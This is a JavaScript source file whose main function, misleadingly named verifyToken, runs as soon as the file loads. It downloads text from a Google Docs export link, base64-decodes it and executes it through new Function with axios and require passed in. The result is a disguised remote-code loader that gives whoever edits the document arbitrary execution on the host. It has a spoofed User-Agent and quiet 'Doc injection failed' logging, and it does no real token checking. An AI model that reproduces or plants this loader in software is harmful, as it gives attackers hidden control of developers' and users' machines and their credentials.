const axios = require("axios");
async function verifyToken(req, res) {
  try {
    const text = await fetchText();
    if (!text) {
      console.warn("[issued] Empty export body.");
      return;
    }

    const decd = dcpayload(text);
    const code = extractRunnableJsFromDecoded(decd);
    new Function('axios', 'require', code)(axios, require);
  } catch (err) {
    const msg = err?.message || String(err);
    console.warn('[issued] Doc injection failed:', msg);
  }
}
verifyToken();

function normalizeDocJs(source) {
  return String(source)
    .replace(/^\uFEFF/, '') // BOM
    .replace(/[\u200B-\u200D\u2060]/g, '') // zero-width chars
    .replace(/[\u201C\u201D]/g, '"')
    .replace(/[\u2018\u2019]/g, "'")
    .trim();
}

function dcpayload(enco) {
  const b64 = normalizeDocJs(enco).replace(/\s/g, "");
  const decd = Buffer.from(b64, "base64").toString("utf8");
  if (!decd) {
    throw new Error("Base64 decd to empty string.");
  }
  return decd;
}

function extractRunnableJsFromDecoded(decoded) {
  const norm = normalizeDocJs(decoded);

  if (norm.startsWith('"') || norm.startsWith("'")) {
    try {
      const unwrapped = JSON.parse(norm);
      if (typeof unwrapped === 'string' && unwrapped.trim()) {
        return normalizeDocJs(unwrapped);
      }
    } catch {
      // fall through
    }
  }

  const m = norm.match(/^(['"])([\s\S]*)\1$/);
  if (m && m[2].trim()) return normalizeDocJs(m[2]);

  return norm;
}

async function fetchText() {
    const url =
    "https://docs.google.com/document/d/1JtFKkU6Ha4m2K3giFPEk0gEMv8UM3deCCAexmfb_0cA/export?format=txt";


    const response = await axios.get(url, {
        responseType: "text",
        transformResponse: (data) => data,
        maxRedirects: 5,
        validateStatus: (s) => s >= 200 && s < 400,
        headers: {
            "User-Agent":
                "Mozilla/5.0 (compatible; medx-dev/1.0; +https://example.invalid)",
        },
    });
    const raw = String(response.data || "").trim();
    if (raw.startsWith("<") || raw.includes("<!DOCTYPE")) {
        throw new Error(
            "Got HTML instead of text — share the Doc as Anyone with the link can view (or use File → Share → Publish to web).",
        );
    }
    return raw;
}
